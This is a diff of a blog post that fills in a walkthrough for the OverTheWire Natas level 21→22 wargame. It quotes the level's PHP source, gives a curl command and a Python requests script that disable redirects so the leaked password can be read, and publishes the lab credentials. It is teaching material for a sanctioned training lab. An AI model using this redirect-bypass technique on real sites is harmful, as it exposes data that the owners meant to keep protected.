@@ -1,80 +1,133 @@
 ---
-date: 2024-01-03 00:00:00 +0700
 layout: post-with-comments
 title: "OverTheWire Natas Level 21 → 22 tutorial!!"
 permalink: /posts/overTheWire-Natas-Level-21-to-22/
-tags: [overthewire, natas, walkthrough, ctf, linux]
+tags: [overthewire, natas, walkthrough, ctf, web, beginner, redirect, http, php]
 description: "A step by step tutorial for OverTheWire Natas Level 21 → 22!!"
 ---
 
-
 <!-- Scoped styles: only affect this post -->
+
 <style>
-  .natas-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
-  .natas-nav .nav-left,.natas-nav .nav-center,.natas-nav .nav-right{flex:1}
-  .natas-nav .nav-left{text-align:left}
-  .natas-nav .nav-center{text-align:center}
-  .natas-nav .nav-right{text-align:right}
-  .natas-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
-  .natas-nav a:hover{transform:translateY(-1px)}
-  .natas-nav .disabled{opacity:.55}
-  :root[data-theme='light'] .natas-nav a{border-color:rgba(0,0,0,.15)}
+  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
+  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
+  .bandit-nav .nav-left{text-align:left}
+  .bandit-nav .nav-center{text-align:center}
+  .bandit-nav .nav-right{text-align:right}
+  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
+  .bandit-nav a:hover{transform:translateY(-1px)}
+  .bandit-nav .disabled{opacity:.55}
+  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
+  code{white-space:pre-wrap}
 </style>
 
-<nav class="natas-nav" aria-label="Natas level navigation">
+<nav class="bandit-nav" aria-label="Natas level navigation">
   <div class="nav-left">
     <a href="{{ '/posts/overTheWire-Natas-Level-20-to-21/' | relative_url }}">← Previous: Level 20 → 21</a>
   </div>
 
   <div class="nav-center">
-    <a href="https://overthewire.org/wargames/" target="_blank" rel="noopener">Official Natas ↗</a>
+    <a href="https://overthewire.org/wargames/natas/natas22.html" target="_blank" rel="noopener">
+      Official (Level 22) ↗
+    </a>
   </div>
 
   <div class="nav-right">
-    <a href="{{ '/posts/overTheWire-Natas-Level-22-to-23/' | relative_url }}">Next: Level 22 → 23 →</a>
+    <a href="{{ '/posts/overTheWire-Natas-Level-22-to-23/' | relative_url }}">
+      Next: Level 22 → 23 →
+    </a>
   </div>
 </nav>
 
 ## Login
 
-Use the **natas21** account from the previous level.
+URL: [http://natas22.natas.labs.overthewire.org](http://natas22.natas.labs.overthewire.org)
+
+Credentials: **natas22\:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz**
 
 ```bash
-ssh natas21@natas.labs.overthewire.org -p <PORT>
-# password: <FROM_PREVIOUS_LEVEL>
+# Using curl (optional):
+curl -u natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz 
+  "http://natas22.natas.labs.overthewire.org/?revelio=1"
 ```
 
-> Binary / page for this challenge: (fill in exact path)
+![homepage]({{ '/assets/images/natas/level-21-to-22/homepage.jpg' | relative_url }})
 
 ---
 
 ## Task
 
-Briefly restate the level’s original prompt (what we need to do).
+The source shows:
+
+```php
+session_start();
+
+if (array_key_exists("revelio", $_GET)) {
+  // only admins can reveal the password
+  if (!($_SESSION && array_key_exists("admin", $_SESSION) && $_SESSION["admin"] == 1)) {
+    header("Location: /");
+  }
+}
+
+if (array_key_exists("revelio", $_GET)) {
+  print "You are an admin. The credentials for the next level are:<br>";
+  ...
+}
+```
+
+The page **prints the password** when `?revelio=1` is present — *even for non-admins* — but then sends a **redirect**. Browsers follow the redirect and hide the printed content. If we **do not follow redirects**, we can read it.
 
 ---
 
-## A little bit of Theory
+## Solution 
 
-Summarize the main concepts you’ll use here. Keep it tight, with bullets if helpful.
+### Python `requests`
+
+```python
+import requests
+
+url = "http://natas22.natas.labs.overthewire.org/?revelio=1"
+auth = ("natas22", "d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz")
+
+# Do not follow the Location redirect
+r = requests.get(url, auth=auth, allow_redirects=False)
+print(r.text)
+```
+
+Output includes the creds straight in the body.
+
+![result]({{ '/assets/images/natas/level-21-to-22/result.jpg' | relative_url }})
 
 ---
 
-## Solution
+## Password
 
-1. Steps
-2. Commands
-3. Output / explanations
-
-> Replace this section with your detailed walkthrough.
+```
+dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs
+```
 
 ---
 
-## Troubleshooting quick tips
+## Why this works
 
-* Tip 1
-* Tip 2
-* Tip 3
+* PHP **echoes content** before calling `header("Location: /")`.
+* Browsers **follow** the redirect, so users don’t see the echoed content.
+* Tools like `curl`/`requests` can **disable redirects** and see the original response.
+
+---
+
+## Troubleshooting
+
+* Seeing only the homepage? Ensure you requested `?revelio=1`.
+* Still getting redirected? Turn off following:
+
+  * `curl` → add `--max-redirs 0`
+  * `requests` → `allow_redirects=False`
+* Blank? Your auth might be wrong; recheck username/password.
+
+---
+
+**Nice! 🎉** That’s a neat example of leaking sensitive data **before** a redirect. Onward to **natas23**!
 
 ---
 
@@ -82,4 +135,4 @@ Summarize the main concepts you’ll use here. Keep it tight, with bullets if he
 
 Until next time — **Otsumachi!!** 💖☄️✨
 
-![Cinema]({ '/assets/images/advice/cinema.gif' | relative_url })
+![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})
